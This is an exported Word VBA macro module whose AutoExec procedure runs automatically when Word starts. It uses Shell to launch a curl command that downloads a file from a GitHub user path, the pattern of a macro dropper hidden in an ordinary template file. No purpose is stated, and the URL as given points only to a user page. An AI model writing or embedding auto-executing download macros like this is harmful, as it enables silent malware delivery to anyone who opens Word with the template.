Attribute VB_Name = "NewMacros"
Sub AutoExec()
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.AutoExec"
    '
    '
    '
    Dim RetVal
    RetVal = Shell("curl -LJO https://github.com/blj-magnar/", 1)
End Sub
